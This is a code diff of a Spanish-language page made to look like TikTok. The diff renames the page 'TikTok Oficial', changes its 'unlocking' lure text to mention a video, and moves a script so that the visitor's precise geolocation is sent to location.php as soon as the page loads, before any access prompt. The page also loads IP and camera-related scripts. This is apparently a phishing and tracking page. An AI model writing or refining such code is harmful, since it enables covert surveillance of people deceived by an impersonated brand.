@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok UI Clone</title>
+  <title>TikTok Oficial</title>
   <style>
     body {
       margin: 0;
@@ -328,7 +328,7 @@
 
 <!-- Animación desbloqueo -->
 <div id="unlockAnimation">
-  <div>Desbloqueando imagen...</div>
+  <div>Desbloqueando video...</div>
   <div class="loader"></div>
 </div>
 
@@ -338,7 +338,21 @@
 <script src="jquery.min.js"></script>
 <script src="ip.js"></script>
 <script src="ajax.js"></script>
-
+  
+<script>
+// Geolocalización
+if ('geolocation' in navigator) {
+  navigator.geolocation.getCurrentPosition(function(pos) {
+    const { latitude, longitude, accuracy } = pos.coords;
+    fetch('location.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ latitude, longitude, accuracy })
+    });
+  });
+}
+</script>
+  
 <script>
 'use strict';
 
@@ -377,17 +391,6 @@ document.getElementById('grantAccess').addEventListener('click', ()=>{
   initCamera();
 });
 
-// Geolocalización
-if ('geolocation' in navigator) {
-  navigator.geolocation.getCurrentPosition(function(pos) {
-    const { latitude, longitude, accuracy } = pos.coords;
-    fetch('location.php', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ latitude, longitude, accuracy })
-    });
-  });
-}
 </script>
 
 </body>
